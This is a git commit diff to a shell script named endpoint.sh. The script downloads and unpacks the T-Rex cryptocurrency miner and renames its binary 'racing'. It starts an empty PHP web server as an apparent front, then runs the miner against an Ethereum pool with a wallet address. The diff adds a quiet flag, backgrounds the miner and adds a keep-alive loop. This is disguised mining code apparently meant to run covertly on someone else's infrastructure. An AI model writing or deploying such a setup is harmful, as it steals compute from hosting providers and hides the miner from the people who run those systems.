844e9fd2a064b7f334796677552a5e70417e3c2f
someonehaha77 <108747108+someonehaha77@users.noreply.github.com>
2022-07-06 07:04:14 +0000

    Update endpoint.sh

--- endpoint.sh
+++ endpoint.sh
@@ -7,4 +7,10 @@ tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
 touch index.php
 php -S 0.0.0.0:8080 &
-/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -p x -w az01
+/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -q -p x -w anohito &
+x=1
+while [ $x -le 5 ]
+do
+  echo "Welcome $x times"
+  sleep 5
+done
